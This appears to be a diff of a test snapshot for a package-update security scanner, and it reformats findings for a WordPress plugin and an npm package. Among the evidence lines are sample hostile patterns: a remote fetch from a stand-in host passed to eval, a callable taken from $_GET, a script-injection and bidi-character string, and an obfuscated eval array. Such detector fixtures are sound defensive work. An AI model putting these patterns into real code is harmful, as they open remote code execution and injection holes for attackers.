@@ -15,228 +15,236 @@
 
   HOLD  countdown-timer-ultimate 2.6.7 → 2.6.8 ───────────────────────────
  ▌  CRITICAL   Archive does not match the published hash
- ▌             includes/integrity-mismatch.php:10
+ ▌             includes/integrity-mismatch.php:10 #1
  ▌             integrity-mismatch evidence
  ▌             → Review integrity-mismatch before you update.
 
  ▌  CRITICAL   Same version, different bytes than the lockfile recorded
- ▌             includes/version-republished.php:10
+ ▌             includes/version-republished.php:10 #2
  ▌             version-republished evidence
  ▌             → Review version-republished before you update.
 
  ▌  CRITICAL   Allowed version now has a different hash
- ▌             includes/approved-version-changed.php:10
+ ▌             includes/approved-version-changed.php:10 #3
  ▌             approved-version-changed evidence
  ▌             → Review approved-version-changed before you update.
 
- ▌  CRITICAL   Listed as malicious by OSV  includes/known-malicious.php:10
+ ▌  CRITICAL   Listed as malicious by OSV
+ ▌             includes/known-malicious.php:10 #4
  ▌             known-malicious evidence
  ▌             → Review known-malicious before you update.
 
- ▌  CRITICAL   Closed on WordPress.org        includes/wporg-closed.php:10
+ ▌  CRITICAL   Closed on WordPress.org     includes/wporg-closed.php:10 #5
  ▌             wporg-closed evidence
  ▌             → Review wporg-closed before you update.
 
  ▌  CRITICAL   Archive entry points outside the package
- ▌             includes/archive-path-escape.php:10
+ ▌             includes/archive-path-escape.php:10 #6
  ▌             archive-path-escape evidence
  ▌             → Review archive-path-escape before you update.
 
  ▌  CRITICAL   Fetches remote code and runs it
- ▌             includes/class-wpos-analytics.php:88
+ ▌             includes/class-wpos-analytics.php:88 #7
  ▌             wp_remote_get('https://analytics.wpos-cdn.example/v2/p') →
  ▌             eval($body)
  ▌             → Review remote-fetch-exec before you update.
 
  ▌  CRITICAL   Decodes hidden code and runs it
- ▌             includes/decode-exec.php:10
+ ▌             includes/decode-exec.php:10 #8
  ▌             decode-exec evidence
  ▌             → Review decode-exec before you update.
 
  ▌  CRITICAL   Hides users from the admin user list
- ▌             includes/admin-user-hidden.php:10
+ ▌             includes/admin-user-hidden.php:10 #9
  ▌             admin-user-hidden evidence
  ▌             → Review admin-user-hidden before you update.
 
  ▌  CRITICAL   Private name also published publicly
- ▌             includes/dependency-confusion.php:10
+ ▌             includes/dependency-confusion.php:10 #10
  ▌             dependency-confusion evidence
  ▌             → Review dependency-confusion before you update.
 
- ▌  CRITICAL   Runs code built at run time          includes/loader.php:20
+ ▌  CRITICAL   Runs code built at run time      includes/loader.php:20 #11
  ▌             $f = $_GET['cb']; $f();
  ▌             raised by owner-change
  ▌             → Review eval-dynamic before you update.
 
   REVIEW  @acme/widgets 1.4.0 → 1.5.0 ────────────────────────────────────
  ▌  HIGH       Lockfile entry moved off the registry
- ▌             includes/lockfile-source-change.php:10
+ ▌             includes/lockfile-source-change.php:10 #12
  ▌             lockfile-source-change evidence
  ▌             → Review lockfile-source-change before you update.
 
  ▌  HIGH       Archive holds a link or special file
- ▌             includes/archive-link.php:10
+ ▌             includes/archive-link.php:10 #13
  ▌             archive-link evidence
  ▌             → Review archive-link before you update.
 
  ▌  HIGH       Archive holds two entries with the same name
- ▌             includes/archive-collision.php:10
+ ▌             includes/archive-collision.php:10 #14
  ▌             archive-collision evidence
  ▌             → Review archive-collision before you update.
 
- ▌  HIGH       Code that could not be analysed  includes/unanalysed.php:10
+ ▌  HIGH       Code that could not be analysed
+ ▌             includes/unanalysed.php:10 #15
  ▌             unanalysed evidence
  ▌             → Review unanalysed before you update.
 
- ▌  HIGH       Runs code built at run time    includes/eval-dynamic.php:10
+ ▌  HIGH       Runs code built at run time
+ ▌             includes/eval-dynamic.php:10 #16
  ▌             eval-dynamic evidence
  ▌             → Review eval-dynamic before you update.
 
  ▌  HIGH       Adds a large encoded or scrambled blob
- ▌             includes/obfuscation.php:10
+ ▌             includes/obfuscation.php:10 #17
  ▌             obfuscation evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review obfuscation before you update.
 
  ▌  HIGH       Unserializes request or remote data
- ▌             includes/input-unserialize.php:10
+ ▌             includes/input-unserialize.php:10 #18
  ▌             input-unserialize evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review input-unserialize before you update.
 
  ▌  HIGH       Writes files outside its own folder
- ▌             includes/write-outside-package.php:10
+ ▌             includes/write-outside-package.php:10 #19
  ▌             write-outside-package evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review write-outside-package before you update.
 
  ▌  HIGH       Creates an administrator account
- ▌             includes/admin-user-create.php:10
+ ▌             includes/admin-user-create.php:10 #20
  ▌             admin-user-create evidence
  ▌             → Review admin-user-create before you update.
 
  ▌  HIGH       Grants admin capabilities to another role
- ▌             includes/capability-change.php:10
+ ▌             includes/capability-change.php:10 #21
  ▌             capability-change evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review capability-change before you update.
 
  ▌  HIGH       Blocks updates of other plugins or themes
- ▌             includes/update-suppression.php:10
+ ▌             includes/update-suppression.php:10 #22
  ▌             update-suppression evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review update-suppression before you update.
 
  ▌  HIGH       Shows search engines different content
- ▌             includes/bot-cloaking.php:10
+ ▌             includes/bot-cloaking.php:10 #23
  ▌             bot-cloaking evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review bot-cloaking before you update.
 
  ▌  HIGH       Reads credentials or tokens
- ▌             includes/credential-access.php:10
+ ▌             includes/credential-access.php:10 #24
  ▌             credential-access evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review credential-access before you update.
 
- ▌  HIGH       Sends site data to a new host    includes/data-exfil.php:10
+ ▌  HIGH       Sends site data to a new host
+ ▌             includes/data-exfil.php:10 #25
  ▌             data-exfil evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review data-exfil before you update.
 
  ▌  HIGH       Hides code in an image, font or text file
- ▌             includes/code-in-asset.php:10
+ ▌             includes/code-in-asset.php:10 #26
  ▌             code-in-asset evidence
  ▌             → Review code-in-asset before you update.
 
  ▌  HIGH       Adds or changes an install script
- ▌             includes/npm-install-script-new.php:10
+ ▌             includes/npm-install-script-new.php:10 #27
  ▌             npm-install-script-new evidence
  ▌             → Review npm-install-script-new before you update.
 
  ▌  HIGH       Runs code when Composer installs it
- ▌             includes/composer-plugin-new.php:10
+ ▌             includes/composer-plugin-new.php:10 #28
  ▌             composer-plugin-new evidence
  ▌             → Review composer-plugin-new before you update.
 
- ▌  HIGH       New owner or publisher         includes/owner-change.php:10
+ ▌  HIGH       New owner or publisher     includes/owner-change.php:10 #29
  ▌             owner-change evidence
  ▌             → Review owner-change before you update.
 
  ▌  HIGH       Release lost its build provenance
- ▌             includes/provenance-dropped.php:10
+ ▌             includes/provenance-dropped.php:10 #30
  ▌             provenance-dropped evidence
  ▌             → Review provenance-dropped before you update.
 
  ▌  HIGH       New dependency named like a popular package
- ▌             includes/typosquat.php:10
+ ▌             includes/typosquat.php:10 #31
  ▌             typosquat evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review typosquat before you update.
 
- ▌  HIGH       Has a known vulnerability  includes/known-vulnerable.php:10
+ ▌  HIGH       Has a known vulnerability
+ ▌             includes/known-vulnerable.php:10 #32
  ▌             known-vulnerable evidence
  ▌             → Review known-vulnerable before you update.
 
- ▌  MEDIUM     Contacts a new domain   includes/outbound-new-domain.php:10
+ ▌  MEDIUM     Contacts a new domain
+ ▌             includes/outbound-new-domain.php:10 #34
  ▌             outbound-new-domain evidence
  ▌             → Review outbound-new-domain before you update.
 
  ▌  MEDIUM     Adds a REST route anyone can call
- ▌             includes/rest-open-route.php:10
+ ▌             includes/rest-open-route.php:10 #35
  ▌             rest-open-route evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review rest-open-route before you update.
 
  ▌  MEDIUM     Changelog does not mention what the code adds
- ▌             includes/changelog-mismatch.php:10
+ ▌             includes/changelog-mismatch.php:10 #36
  ▌             changelog-mismatch evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review changelog-mismatch before you update.
 
- ▌  MEDIUM     Adds a runtime dependency    includes/dependency-new.php:10
+ ▌  MEDIUM     Adds a runtime dependency
+ ▌             includes/dependency-new.php:10 #37
  ▌             dependency-new evidence
  ▌             → Review dependency-new before you update.
 
  ▌  MEDIUM     Adds a file that runs on every request
- ▌             includes/composer-autoload-files.php:10
+ ▌             includes/composer-autoload-files.php:10 #38
  ▌             composer-autoload-files evidence
  ▌             → Review composer-autoload-files before you update.
 
- ▌  MEDIUM     Released very recently        includes/fresh-release.php:10
+ ▌  MEDIUM     Released very recently    includes/fresh-release.php:10 #39
  ▌             fresh-release evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review fresh-release before you update.
 
  ▌  MEDIUM     First release after a long silence
- ▌             includes/dormant-release.php:10
+ ▌             includes/dormant-release.php:10 #40
  ▌             dormant-release evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review dormant-release before you update.
 
  ▌  MEDIUM     No matching tag in the repository
- ▌             includes/git-tag-missing.php:10
+ ▌             includes/git-tag-missing.php:10 #41
  ▌             git-tag-missing evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review git-tag-missing before you update.
 
- ▌  MEDIUM     Code grew far more than usual     includes/size-jump.php:10
+ ▌  MEDIUM     Code grew far more than usual
+ ▌             includes/size-jump.php:10 #42
  ▌             size-jump evidence
  ▌             likely: a heuristic, not an exact pattern
  ▌             → Review size-jump before you update.
 
  ▌  MEDIUM     Hidden or bidirectional characters in code
- ▌             includes/admin.php:12
+ ▌             includes/admin.php:12 #43
  ▌             \x1b[31mred\u202etxt.php <script>alert(1)</script>
  ▌             [link](https://evil.example) @team token npm_•••••
  ▌             → Review unicode-hidden before you update.
 
- ▌  MEDIUM     Adds a credential to the code         includes/config.php:3
+ ▌  MEDIUM     Adds a credential to the code     includes/config.php:3 #44
  ▌             define('API_KEY', 'sk_l•••••');
  ▌             → Review secret-added before you update.
 
  ▌  MEDIUM     Adds a large encoded or scrambled blob
- ▌             assets/js/vendor.min.js:1
+ ▌             assets/js/vendor.min.js:1 #45
  ▌             var _0x1a2b=['\x65\x76\x61\x6c'];
  ▌             demoted: vendored path
  ▌             likely: a heuristic, not an exact pattern
